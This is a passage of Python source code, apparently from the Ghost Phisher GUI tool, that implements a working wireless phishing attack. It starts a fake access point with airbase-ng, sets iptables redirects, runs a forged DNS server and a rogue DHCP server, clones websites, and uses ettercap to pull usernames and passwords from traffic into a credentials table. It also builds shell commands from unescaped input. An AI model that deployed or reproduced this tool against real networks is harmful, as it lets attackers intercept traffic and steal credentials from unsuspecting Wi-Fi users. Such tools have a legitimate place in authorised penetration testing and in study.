            commands.getstatusoutput('airmon-ng stop %s'%(disable_monitor))
        compatible_cards = commands.getstatusoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")[1]
        self.comboBox.clear()
        if compatible_cards != '':
            card_list = []
            compatible_cards = commands.getstatusoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")[1]
            for cards in os.listdir('/sys/class/net'):
                if cards in compatible_cards:
                    if cards not in card_list:
                        card_list.append(cards)

            self.comboBox.addItems(card_list)
            self.access_textbrowser.clear()
            self.monitor_button.setEnabled(True)
            self.card_details()
        else:
            self.access_textbrowser.clear()
            self.access_textbrowser.append('<font color=red>No wireless interface card detected</font>')

    def card_details(self):
        global mac_address
        selected_card = str(self.comboBox.currentText())
        if selected_card != '':
            compatible_cards = commands.getstatusoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'")[1]
            card_process = compatible_cards.splitlines()
            for card_detail in card_process:
                if selected_card in str(card_detail):
                    self.acess_interface.setText('Current Interface:&nbsp;<font color=green> %s</font>'%(card_detail.split()[0]))
                    self.driver_label.setText('Driver:&nbsp;<font color=green> %s</font>'%(card_detail.split()[2]))
                    mac_process = open('/sys/class/net/%s/address'%(selected_card))
                    mac_address = mac_process.read().strip('\n')
                    self.mac_address_label.setText('Mac Address:&nbsp;<font color=green> %s</font>'%(mac_address))
                    self.monitor_label.setText('Monitor:&nbsp;<font color=red>Not Started</font>')
                    self.monitor_button.setEnabled(True)
                    mac_process.close()


    def set_monitor(self):
        global monitor
        selected_card = str(self.comboBox.currentText())
        attempt_monitor = commands.getstatusoutput("airmon-ng start %s"%(selected_card))
        mon_string = ''
        if attempt_monitor[0] == 0:
            if 'monitor mode enabled' in attempt_monitor[1]:
                for iterate in os.listdir('/sys/class/net'):
                    if iterate.startswith('mon'):
                        mon_string += iterate
                        break
                if mon_string == '':
                    monitor = selected_card
                else:
                    monitor = mon_string

                self.monitor_label.setText('Monitor:&nbsp;<font color=green> %s</font>'%(monitor))
                self.monitor_button.setEnabled(False)
                self.groupBox_16.setEnabled(True)
                self.access_start.setEnabled(True)
        else:
            self.access_textbrowser.append('<font color=red>Failed to set %s on monitor mode: %s</font>'%(selected_card,attempt_monitor[1]))


    def launch_Access_Point(self):
        global access_name
        global access_point_ip
        global encryption_key
        global access_point_control

        access_point_control = 1
        access_name = str(self.access_name_edit.text())
        access_point_ip = str(self.ip_address_label_2.text())
        encryption_key = str(self.lineEdit.text())

        if 'access_point_log' in os.listdir('/tmp/'):
            os.remove('/tmp/access_point_log')

        if access_name == '':
            QtGui.QMessageBox.warning(self,"NULL Access Point Name","Please input a name you intend to name the access point e.g Rouge-WIFI")
            access_point_control = 0
        elif access_point_ip.count('.') < 3:
            access_point_control = 0
            QtGui.QMessageBox.warning(self,"Invalid IP address","Please input a valid IP address in the (Access Point Name:) section")
        elif self.wpa_radio.isChecked() == True:
            if encryption_key == '':
                access_point_control = 0
                QtGui.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")
        elif self.wep_radio.isChecked() == True:
            if encryption_key == '':
                access_point_control = 0
                QtGui.QMessageBox.warning(self,"NULL Encryption Key","Please input a key you intend to encrypt exchange information in on the Key text area e.g 1234567890")

        if access_point_control != 0:
            self.access_textbrowser.append('<font color=green>Starting Fake Access Point...</font>')
            thread.start_new_thread(self.rouge_launch,())
            thread.start_new_thread(self.update_browser_thread,())


    def clear_key_area(self):
        self.lineEdit.clear()


    def update_access_error(self):
        global access_point_error
        self.access_textbrowser.clear()
        self.access_start.setEnabled(True)
        self.access_stop.setEnabled(False)
        self.access_textbrowser.append('<font color=red>Unable to start Fake AP: %s</font>'%(access_point_error))


    def update_access_output(self):
        global mac_address

        self.access_textbrowser.clear()
        try:
            access_point_file = open('/tmp/access_point_log')
            access_point_output = access_point_file.read()
            if access_point_output.count('Client') != 0:
                self.access_connection_label.setText('Connections:<font color=green> %s</font>'\
                                                     %(str(access_point_output.count('Client'))))
            for iterate in access_point_output.splitlines():
                self.access_textbrowser.append('<font color=green> %s</font>'%(iterate))
            access_point_file.close()
        except IOError:
            self.stop_access_point()


    def access_point_started(self):
        global essid
        global ip_address_text

        self.groupBox_16.setEnabled(False)
        self.access_point_label.setText('Acess Point Name:<font color=green>  %s</font>'%(essid))
        self.channel_label.setText('Channel:<font color=green> %s</font>'%(channel))
        self.ip_address_label.setText('IP address:<font color=green> %s</font>'%(ip_address_text))
        self.access_runtime.setText('Runtime:<font color=green> %s</font>'%(time.ctime()))
        self.main_mac_address_label.setText('Mac Address:<font color=green> %s</font>'%(mac_address))
        self.access_start.setEnabled(False)
        self.access_stop.setEnabled(True)
        create_settings('self.access_name_edit',essid)
        create_settings('ip_address_label_2',ip_address_text)

        # Gives Acess point connection client internet access
        filter_interface = ['Default Route Address','Loopback Address']
        for iterate in usable_interface_cards.keys():
            if iterate not in filter_interface:
                commands.getstatusoutput("""iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000"""%\
                                               (iterate,usable_interface_cards[iterate])
                                               )


        usable_interface_cards['at0']= ip_address_text

        access_interface = []
        for iterate in usable_interface_cards.keys():
            access_interface.append(iterate)
        access_interface.sort()
        access_interface.reverse()

        self.card_interface_combo.clear()
        self.card_interface_combo.addItems(access_interface)

        interface_cards_httpa = []
        for iterate2 in usable_interface_cards.keys():
            if iterate2 != 'Default Route Address':
                interface_cards_httpa.append(iterate2)

        interface_cards_httpa.sort()
        interface_cards_httpa.reverse()

        self.http_interface_combo.clear()
        self.http_interface_combo.addItems(interface_cards_httpa)





    def stop_access_point(self):
        global access_point_control
        access_point_control = 0
        if 'access_point_log' in os.listdir('/tmp/'):
            os.remove('/tmp/access_point_log')
        commands.getstatusoutput('killall airbase-ng')
        self.groupBox_16.setEnabled(True)
        self.access_point_label.setText('Acess Point Name:')
        self.channel_label.setText('Channel:')
        self.ip_address_label.setText('IP address:')
        self.access_runtime.setText('Runtime:')
        self.main_mac_address_label.setText('Mac Address:')
        self.access_textbrowser.append('<font color=red>Access Point Stopped at: %s</font>'%(time.ctime()))
        self.access_start.setEnabled(True)
        self.access_stop.setEnabled(False)



    def rougue_launch_phase(self):
        global ip_address_text

        period_number = ip_address_text.index('.')
        first_octect = ip_address_text[0:period_number]
        if int(first_octect) in range(1,127):               # Class A IP address (netmask will be 255.0.0.0)
            netmask = '255.0.0.0'
        elif int(first_octect) in range(128,191):           # Class B IP address (netmask will be 255.255.0.0)
            netmask = '255.255.0.0'
        else:
            netmask = '255.255.255.0'

        while 'access_point_log' not in os.listdir('/tmp/'):
            time.sleep(3)
        commands.getstatusoutput('ifconfig at0 up')
        commands.getstatusoutput('ifconfig at0 %s netmask %s'%(ip_address_text,netmask))
        self.emit(QtCore.SIGNAL("access point started"))




    def rouge_launch(self):
        global essid
        global channel
        global mac_address
        global ip_address_text
        global access_point_control
        global monitor
        global access_point_error


	essid = str(self.access_name_edit.text())
        channel = str(self.channel_combo.currentText())
        ip_address_text = str(self.ip_address_label_2.text())
        key = str(self.lineEdit.text())

        thread.start_new_thread(self.rougue_launch_phase,())

        if self.rouge_radio.isChecked() == True:
            output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s %s > /tmp/access_point_log"%(mac_address,essid,channel,monitor))
        elif self.wep_radio.isChecked() == True:
            output = commands.getstatusoutput("airbase-ng -a %s -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))
        else:
            output = commands.getstatusoutput("airbase-ng -a %s -z 2 -e '%s' -c %s -w %s %s > /tmp/access_point_log"%(mac_address,essid,channel,key,monitor))



        if output[0] > 0:
            access_point_error = output[1]
            access_point_control = 0
            self.emit(QtCore.SIGNAL("access point error"))




    def update_browser_thread(self):
        global access_point_control
        while access_point_control ==  1:
            time.sleep(3)
            self.emit(QtCore.SIGNAL("access point output"))






    #########################################################################
    #       FAKE DNS SERVER DEFINITION ,FUNCTIONS AND SIGNALS               #
    #########################################################################

    def update_dns_address(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of interface combo
        '''
        global usable_interface_cards

        ip_address = []             #Holds ip address of the selected card

        selected_interface = str(self.card_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_interface])
        except KeyError:
            pass
        self.ip_address_combo.clear()                                       #clear the ip address combo
        self.ip_address_combo.addItems(ip_address)                          #display ip address on combo
        self.current_card_label.setText("<font color=green>\
                                        Current Interface:</font>  %s"%(selected_interface))

    def update_selection(self):
        ''' Disables un-used settings buttons if
            not selected
        '''
        if self.resolveall_radio.isChecked() == True:
            self.domain_add_button.setEnabled(False)
        else:
            self.domain_add_button.setEnabled(True)



    def dns_started(self):
        self.dns_connection_label.setText('Connections:')
        self.dns_textbrowser.append('<font color=green>Started DNS Service at %s'%(time.ctime()))
        self.label_5.setText("<font color=green>Runtime:</font> %s"%(time.ctime()))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> %s"%\
                                           (str(self.ip_address_combo.currentText())))

    def update_dns_connections(self):
        global dns_connections
        dns_connections += 1
        self.dns_connection_label.setText('Connections:<font color=green>\t %s</font>'%(dns_connections))


    def announce_client(self,client_hostname,address):
        global selected_dns_ip_address
        if len(address) > 2:
            self.dns_textbrowser.append('<font color=green>%s just got our Fake IP address for %s</font>'%(client_hostname,address))
        else:
            if str(client_hostname) != str(selected_dns_ip_address):
                self.dns_textbrowser.append('<font color=green>%s just got our Fake IP address</font>'%(client_hostname))



    def break_last_loop_thread(self):
        global selected_dns_ip_address
        dns_fake_ip = str(selected_dns_ip_address)
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.sendto('empty query',(dns_fake_ip,53))   # This ultimately breaks the last turn of the DNS loop to aviod restart exceptions
        sock.close()


    def stop_dns(self):
        global dns_contol
        global dns_connections
        dns_contol = 1
        dns_connections = 0
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        thread.start_new_thread(self.break_last_loop_thread,())     # This thread breaks the last DNS loop, we get segmentfaults if we run it here directly
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>DNS Service stopped at %s'%(time.ctime()))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")


    def dns_failed(self):
        global dns_contol
        dns_contol = 1
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>DNS Server failed to start: %s'%(exception))
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")
        thread.start_new_thread(self.break_last_loop_thread,())

    def dns_system_interrupt(self):
        global dns_contol
        dns_contol = 1
        self.dns_start.setEnabled(True)
        self.dns_stop.setEnabled(False)
        self.label_5.setText("<font color=green>Runtime:</font> Service not started")
        self.dns_textbrowser.append('<font color=red>Shit!, we got a system interrupt, Please restart service')
        self.service_dns_run_label.setText("<font color=green>Service running on:</font> Service not started")


    def dns_response(self,query,fake_ip):
        ''' function crafts query packets to be sent
            to client,packets are made in respect to
            the IETF standard.
            http://www.ietf.org/rfc/rfc1035.txt
        '''
        packet = ''
        packet+=query[:2] + "\x81\x80"
        packet+=query[4:6] + query[4:6] + '\x00\x00\x00\x00'                # Questions and Answers Counts
        packet+=query[12:]                                                  # Original Domain Name Question
        packet+='\xc0\x0c'                                                  # Pointer to domain name
        packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'                  # Response type, ttl and resource data length -> 4 bytes
        packet+=str.join('',map(lambda x: chr(int(x)),fake_ip.split('.')))  # 4bytes of IP
        return packet

    #
    # DNS Server Thread
    #
    def dns_server_thread(self,alternate,arg2):                                  # alternate variable tells the application that im running the program in a ip to wesite bases
        ''' Thread open a Default UDP port 53
            for servicing client queries.
        '''
        global exception
        global dns_ip_and_websites
        global selected_dns_ip_address

        dns_fake_ip = str(self.dns_ip_address.text())
        selected_dns_ip_address = str(self.ip_address_combo.currentText())
        time.sleep(2)
        try:
            DNS_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            DNS_socket.bind((selected_dns_ip_address,53))
            self.emit(QtCore.SIGNAL("dns started"))
            while True:
                if dns_contol == 0:
                    if alternate != None:
                        DNS_query = DNS_socket.recvfrom(1024)
                        for website in dns_ip_and_websites.keys():
                            website_string = str(website)
                            process = website_string[website_string.index('.')+1:-1]
                            striped_webstring = process[0:process.index('.')]
                            if striped_webstring in DNS_query[0]:
                                corresponding_ip = dns_ip_and_websites[website]
                                DNS_socket.sendto(self.dns_response(DNS_query[0],corresponding_ip),DNS_query[1])
                                self.announce_client(DNS_query[1][0],website)
                                self.emit(QtCore.SIGNAL("new client connection"))
                    else:
                        DNS_query = DNS_socket.recvfrom(1024)
                        DNS_socket.sendto(self.dns_response(DNS_query[0],dns_fake_ip),DNS_query[1])
                        self.announce_client(DNS_query[1][0],'1')
                        self.emit(QtCore.SIGNAL("new client connection"))
                else:
                    break
        except socket.error,e:
            exception = e[1]
            self.emit(QtCore.SIGNAL("dns failed"))
            DNS_socket.close()

    def ip_to_website(self):
        ''' maps fake ip address to corresponding
            websites in the global dictionary
        '''
        global dns_ip_and_websites
        domain_ip_address = str(self.domain_ip.text())
        website_address = str(self.domain_label.text())
        if domain_ip_address.count('.') != 3:                                   # Check if inputed data is valid
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid Fake IP address to map to website")
        elif len(website_address) < 3:
            QtGui.QMessageBox.warning(self,"Invalid Web Address","Please input a web address to map to IP address")
        else:
            dns_ip_and_websites[website_address] = domain_ip_address
            self.dns_textbrowser.append('<font color=green>Added \'%s\' resolving as %s</font>'%(website_address,domain_ip_address))
            self.domain_ip.clear()
            self.domain_label.clear()

    def launch_dns(self):
        ''' Launches DNS attack pending on the
            option selected from the radio
            buttons
        '''
        global dns_ip_and_websites
        global dns_contol
        dns_contol = 0
        fake_dns_resolution_ip = ''                                             # holds the fake dns resolution ip address
        if self.resolveall_radio.isChecked() == True:
            if str(self.dns_ip_address.text()).count('.') != 3:                 #Check if ip address area is empty
                QtGui.QMessageBox.warning(self,'Invalid Resolution IP Address','Please input a valid Fake IP address of which you want the dns to resolve client queries')
            else:
                fake_dns_resolution_ip += str(self.dns_ip_address.text())
                create_settings('self.dns_ip_address',fake_dns_resolution_ip)       # Write settings to last settings file
                self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                self.dns_start.setEnabled(False)
                self.dns_stop.setEnabled(True)
                thread.start_new_thread(self.dns_server_thread,(None,0))                  # DNS Server thread
        else:
            try:
                dns_ip_and_websites.keys()[0]
                self.dns_textbrowser.append('<font color=green>Starting Fake DNS Server....')
                self.dns_start.setEnabled(False)
                self.dns_stop.setEnabled(True)
                thread.start_new_thread(self.dns_server_thread,(1,0))
            except IndexError:
                QtGui.QMessageBox.warning(self,"Empty IP to Website address mappings","Seems you forgot to add websites and IP addresses using the (Add) button")
                self.domain_add_button.setFocus()




    #########################################################################
    #       FAKE DHCP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def determine_subnet(self):
        ''' Determines the subnet mask from the
            live ip address input of user
        '''
        start_ip = str(self.start_ip.text())
        try:
            period_number = start_ip.index('.')
            first_octect = start_ip[0:period_number]
            if int(first_octect) in range(1,127):               # Class A IP address (netmask will be 255.0.0.0)
                self.subnet_ip.setText('255.0.0.0')
            elif int(first_octect) in range(128,191):           # Class B IP address (netmask will be 255.255.0.0)
                self.subnet_ip.setText('255.255.0.0')
            else:
                self.subnet_ip.setText('255.255.255.0')         # Class C IP address (netmask will be 255.255.255.0)
        except ValueError:
            pass


    def stop_dhcp(self):
        ''' Stop the DHCP Server'''

        global dhcp_config_file
        global dhcp_pid_file

        self.dhcp_start.setEnabled(True)
        self.dhcp_stop.setEnabled(False)
        #start-stop-daemon --stop --quiet --pidfile $DHCPDPID
        if os.path.exists(dhcp_pid_file):
            dhcp_pid = open(dhcp_pid_file).read().strip()
            stop_dhcp_status = commands.getstatusoutput('kill -9 %s' % dhcp_pid)
            #stop_dhcp_status = commands.getstatusoutput('/etc/init.d/dhcp3-server stop')

        self.dhcp_status.append('<font color=red>DHCP Server stopped at %s'%(time.ctime()))


    def launch_dhcp(self):
        ''' Launch DHCP spoofing if all
            conditions are right
        '''
        global dhcp_subnet
        global dhcp_installation_status
        global dhcp_server_binary
        global dhcp_config_file
        global dhcp_pid_file

        start_ip = str(self.start_ip.text())
        stop_ip = str(self.stop_ip.text())
        gateway_ip = str(self.gateway_ip.text())
        fakedns_ip = str(self.fakedns_ip.text())
        subnet_ip = str(self.subnet_ip.text())
        alternatedns_ip = str(self.alternatedns_ip.text())

        if dhcp_installation_status == 'not installed':
            self.dhcp_status.append('<font color=green>DHCP3 Server is not installed run:</font>\t<font color=red>"apt-get install dhcp3-server" to install</font>')
        elif start_ip.count('.') != 3:                                   # Check if inputed data is valid
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (From:) section")
        elif stop_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (To:) section")
        elif gateway_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Gateway Address:) section")
        elif fakedns_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Fake DNS IP:) section, input the address from the fake DNS")
        elif alternatedns_ip.count('.') != 3:
            QtGui.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Alternate  DNS IP :) section, is best you input a real DNS server IP address here to fasten HTTP responce on an intranet based networks")
        else:
            create_settings('self.start_ip',start_ip)                   # Write settings to last_settings file
            create_settings('self.stop_ip',stop_ip)
            create_settings('self.fakedns_ip',fakedns_ip)
            create_settings('self.gateway_ip',gateway_ip)
            create_settings('self.subnet_ip',subnet_ip)
            create_settings('self.alternatedns_ip',alternatedns_ip)

            #update:
            #   start dhcp server using a custom config file.




            #if 'dhcpd.conf_original' in os.listdir('/etc/dhcp3/'):      # Remove dhcpd.conf file if ghost_phiser had earlierly created it to avoid using old settings
            #    if 'dhcpd.conf' in os.listdir('/etc/dhcp3'):
            #        os.remove('/etc/dhcp3/dhcpd.conf')
            #else:
            #    os.rename('/etc/dhcp3/dhcpd.conf','/etc/dhcp3/dhcpd.conf_original')     # Backup your original dhcp settings if they exist
            #
            #
            if subnet_ip == '255.0.0.0':                                # Class A subnet and broadcast address
                process = start_ip[0:start_ip.index('.')]
                broadcast = process + '.255.255.255'
                subnet = process + '.0.0.0'

            elif subnet_ip == '255.255.0.0':                            # Class B subnet and broadcast address
                process = start_ip[0:start_ip.rindex('.')-2]
                broadcast = process + '.255.255'
                subnet = process + '.0.0'
            else:
                process = start_ip[0:start_ip.rindex('.')]              # Class C  subnet and broadcast address
                broadcast = process + '.255'
                subnet = process + '.0'

                                                                        # DHCP3 Server configuration file
            dhcp_settings_string = '''
            ddns-update-style none;

            option domain-name-servers %s, %s;

            default-lease-time 86400;
            max-lease-time 604800;

            authoritative;

            subnet %s netmask %s {
                    range %s %s;
                    option subnet-mask %s;
                    option broadcast-address %s;
                    option routers %s;
            }
            '''

            dhcp_settings_file = dhcp_settings_string % (fakedns_ip,alternatedns_ip,subnet,subnet_ip,\
                                                         start_ip,stop_ip,subnet_ip,broadcast,gateway_ip)

            if os.path.exists(dhcp_config_file):
                os.remove(dhcp_config_file)

            if os.path.exists(dhcp_pid_file):
                os.remove(dhcp_pid_file)

            dhcp_settings = open(dhcp_config_file,'a+')
            dhcp_settings.write(dhcp_settings_file)
            dhcp_settings.close()
            cmd = "%s -cf %s -pf %s" % (dhcp_server_binary, dhcp_config_file, dhcp_pid_file)
            dhcp_status = commands.getstatusoutput(cmd)

            if dhcp_status[0] == 0:
                self.dhcp_status.append('<font color=green>%s at %s </font>'%(dhcp_status[1],time.ctime()))  # DHCP ran successfully
                self.dhcp_start.setEnabled(False)
                self.dhcp_stop.setEnabled(True)
            else:
                for dhcp_failure in dhcp_status[1].splitlines():
                    self.dhcp_status.append('<font color=red>%s</font>'%(dhcp_failure))  # DHCP did not run successfully





    #########################################################################
    #       FAKE HTTP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def HTTP_Server(self,http_server_port,working_directory):                  # HTTP Server Thread
        '''HTTP Server thread, uses mini-httpd webserver'''
        # Clear logfile
        if 'http_logfile' in os.listdir('/tmp/'):
            os.remove('/tmp/http_logfile')
        http_server_launch = commands.getstatusoutput('mini-httpd -p %d -dd %s -l /tmp/http_logfile'% \
                                                    (http_server_port,working_directory))


    def stop_http(self):
        ''' Stop the DHCP Server'''
        global http_control
        global http_address                 # Holds the address where Fake HTTP server is running e.g http://192.168.0.1/
        http_control = 1
        self.http_start.setEnabled(True)
        self.http_stop.setEnabled(False)
        commands.getstatusoutput('killall mini-httpd')
        commands.getstatusoutput('killall ettercap')
        self.status_textbrowser_http.append('<font color=red>HTTP Server Stopped at: %s</font>'%(time.ctime()))
        self.http_ip_label.setText('<font color=green>Service running on:</font>  Service not started')
        self.label_13.setText('<font color=green>Runtime:</font>  Service not started')

    def new_connection(self):
        ''' Updates the http textbrowser with
            connection details of a new client
        '''
        read_http_log = open('/tmp/http_logfile')
        http_details = read_http_log.read().splitlines()
        self.status_textbrowser_http.append('<font color=blue>%s</font>'\
                                    %(http_details[-1]))

    def sniff_thread(self):
        ''' Thread launches ettercap as the sniffing
            engine
        '''
        global http_control

        interface = str(self.http_interface_combo.currentText())    # Http interface card
        if interface == 'Loopback Address':
            sniff_interface = 'lo'
        else:
            sniff_interface = interface

        pipe = subprocess.Popen('ettercap -i %s -T -q'%(sniff_interface),shell=True,stdout= subprocess.PIPE)
        sniff_output = pipe.stdout
        while http_control != 1:
            capture = str(sniff_output.readline())
            if 'HTTP' in capture:
                credential_process = capture.split()
                username = credential_process[5]
                password = credential_process[7]
                if str(self.lineEdit_2.text()) == '':
                    website = credential_process[-1]
                else:
                    website = str(self.lineEdit_2.text())
                if 'PASS:' != username:                     # Basic filter
                    self.database_commit(website,username,password)
                    self.emit(QtCore.SIGNAL('new credential'))





    def http_update_thread(self):
        ''' This thread checks the '/tmp/http_logfile'
            for new connections
        '''
        global http_control
        connection_number = 0

        while http_control == 0:
            time.sleep(2)
            connection_file = open('/tmp/http_logfile')
            new_connection_number = connection_file.read().splitlines()
            connection_file.close()
            if connection_number != len(new_connection_number):
                connection_number += 1
                self.emit(QtCore.SIGNAL("new connection"))


    def new_credential(self):
        ''' Inputs data to Database Table after
            quering from database file
        '''
        global captured_credential

        database_items = self.fetch_data()
        items = str(database_items).count('u')
        try:
            for iterate in range(0,items/3):
                self.credential_table.removeRow(iterate)
                self.credential_table.insertRow(iterate)

                current_credential = database_items[iterate]           # Hold data like (u'www.foo-bar.com',u'username',u'password)

                website = QtGui.QTableWidgetItem()
                username = QtGui.QTableWidgetItem()
                password = QtGui.QTableWidgetItem()

                website.setText(current_credential[0])
                self.credential_table.setItem(iterate,0,website)
                username.setText(current_credential[1])
                self.credential_table.setItem(iterate,1,username)
                password.setText(current_credential[2])
                self.credential_table.setItem(iterate,2,password)
        except IndexError:
            pass
        captured_credential += 1
        self.http_captured_credential.setText('captured credentials:<font color=green>\t %s</font>'%(captured_credential))




    def set_usable(self):
        ''' Disables un-used settings buttons if
            not selected
        '''
        if self.emulate_website_radio.isChecked() == True:
            self.website_button.setEnabled(False)
            self.emulate_website_label.setText('http://')
            self.website_linedit.clear()

        else:
            self.website_button.setEnabled(True)
            self.emulate_website_label.clear()



    def update_http_address(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of http interface
            card combobox
        '''
        global usable_interface_cards   # Dictionary holding IP / Interface card mappings

        ip_address = []                 #Holds ip address of the selected card

        selected_http_interface_card = str(self.http_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_http_interface_card])
        except KeyError:
            pass
        self.http_ip_combo.clear()                                       #clear the ip address combo
        self.http_ip_combo.addItems(ip_address)                          #display ip address on combo
        self.current_card_label_2.setText("<font color=green>\
                                        Current Interface:</font>  %s"%(selected_http_interface_card))


    def browse_webpage(self):
        ''' Browse and select webpages that
            are intended to be hosted
        '''
        webpage = QtGui.QFileDialog.getOpenFileName(self,"Select Webpage","","HTML Scripts(*.html *.htm)")
        if webpage != '':
            self.website_linedit.setText(webpage)
            create_settings('self.website_linedit',webpage)

        commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript')



    def launch_http_server(self):
        ''' Evaluates user settings and launches
            webserver to host web-script
        '''
        global http_installation_status

        self.status_textbrowser_http.clear()

        if http_installation_status == 'not installed':
            self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
            self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')

        elif self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
            if len(str(self.lineEdit_2.text())) < 3:
                QtGui.QMessageBox.warning(self,'Invalid URL or IP address','Please input the original url or ip address of the spoofed website')
            else:
                self.start_http_service()
        else:
            self.start_http_service()


    def start_http_service(self):
        '''Starts the HTTP Service'''
        global http_address
        global http_server_port

        http_error = 0               # Informs conditional blocks of success of other blocks

        if 'website_url.log' in os.listdir(os.sep + 'tmp' + os.sep):
            os.remove(os.sep + 'tmp' + os.sep + 'website_url.log')

        if 'new_connection.log' in os.listdir(os.sep + 'tmp' + os.sep):
            os.remove(os.sep + 'tmp' + os.sep + 'new_connection.log')
        credential_signal = open(os.sep + 'tmp' + os.sep + 'new_connection.log','a+')
        os.chmod('/tmp/new_connection.log',0777)                                        # Same as linux terminals: "chmod 777 /tmp/new_connection.log"
        credential_signal.close()



        if self.run_webpage_port_radio.isChecked() == True:     # Check if http port section has been changed
            try:
                http_server_port = int(self.use_port_http.text())
            except ValueError:
                QtGui.QMessageBox.warning(self,"Invalid Port Number","Please input a valid port number on the (Run Webpage on Port :) section")

        if 'HTTP-Webscript' in os.listdir(cwd):     # Create web directory if it does not exist
            commands.getstatusoutput('rm -r ' + cwd + '/HTTP-Webscript')
        os.mkdir(cwd + '/HTTP-Webscript')

        if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
            os.mkdir('Ghost-Phisher-Database')



        if self.select_website_radio.isChecked() == True:
            web_script = str(self.website_linedit.text())
            if web_script == '':
                http_error += 1
                QtGui.QMessageBox.warning(self,"Invalid Web-Script","Please browse and select a web-script to host from the (Select Webpage:) section")
            else:
                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')

                html_process = web_script.replace(os.sep,'\n')      # This section moves the Web script and its files to the HTTP Webscript directory
                html_file = html_process.splitlines()[-1]           # Holds file name like (index.html)

                html_name_process = html_file.replace('.','\n').splitlines()
                html_name = html_name_process[0]

                html_file_folder = ''                               # Holds folder name like (index_files)

                for files in os.listdir(web_script.replace(html_file,'')):  # Iterates over the directory where html file is situated
                    if html_name in files:
                        if files != html_file:
                            html_file_folder += files

                if html_name in html_file_folder:
                    html_file_folder_path = web_script.replace(html_file,html_file_folder)
                else:
                    html_file_folder_path = ''

                webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep

                response = commands.getstatusoutput('cp -r %s %s \n cp -r %s %s'%(web_script,webserver_path,\
                                                                              html_file_folder_path,webserver_path))

                try:
                    os.rename('%s/HTTP-Webscript/%s'%(cwd,html_file),'%s/HTTP-Webscript/index.html'%(cwd))               # rename our webscript to what the web server can host
                    if response[0] != 0:
                        if html_file_folder == '':
                            self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')
                            self.status_textbrowser_http.append('<font color=green>Generating CGI script for handling POST request</font>')
                        else:
                            self.status_textbrowser_http.append('<font color=red>Failed to move webscript files to Web-Server directory: %s</font>'%(response[1]))
                            http_error += 1
                    else:
                        self.status_textbrowser_http.append('<font color=green>Moving webcript files to Web-Server directory...</font>')

                except OSError,e:
                    self.status_textbrowser_http.append('<font color=red>Unable to start HTTP Server: %s</font>'%(e))
                    http_error += 1

        else:
            website_url = str(self.emulate_website_label.text())
            if len(website_url) > 7:
                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
                commands.getstatusoutput('rm -r ' + cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
                os.mkdir(cwd + '/HTTP-Webscript')
                try:
                    url_source = urllib2.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
                    web_script = open('HTTP-Webscript/index.html','a+')
                    web_script.write(url_source.read())
                    self.status_textbrowser_http.append('<font color=green>Successfully cloned %s</font>'%(website_url))
                    web_script.close()
                except(urllib2.URLError):
                    self.status_textbrowser_http.append('<font color=red>Unable to fetch and clone website: network timeout</font>')
            else:
                QtGui.QMessageBox.warning(self,"Invalid URL","Please input a valid url to the (Clone Website:) text area \n e.g http://www.foo-bar.com")

            #
            # Giving the file and Database directory run permission, else HTTP server will not submit any POST request
            #
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0777)

        if dns_contol == 0:
            if http_server_port == 80:
                http_address = 'http://%s/'%(str(self.lineEdit_2.text()))  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
            else:
                http_address = 'http://%s:%s/'%(str(self.lineEdit_2.text(),http_server_port))    # Evaluate server address e,g http://192.168.0.23:8080/

        else:
            actions_ip_address = str(self.http_ip_combo.currentText())
